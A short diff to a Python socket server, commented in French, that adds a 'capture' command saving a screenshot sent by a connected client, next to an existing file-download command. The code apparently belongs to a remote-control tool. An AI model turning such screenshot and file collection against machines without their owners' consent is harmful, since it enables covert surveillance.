@@ -1,5 +1,6 @@
 #SOCKET RESEAU : SERVEUR
 
+import subprocess
 import socket
 
 
@@ -61,6 +62,11 @@ def send_to_client_and_receive_all_data(connection_socket, commande = 'infos'):
             f.write(response_bi)
             f.close()
             response = "Dl ok"
+    elif commande == "capture":
+        f = open("capture.png","wb")
+        f.write(response_bi)
+        f.close()
+        response = "Capture OK"
     else:
         response = response_bi.decode()
 
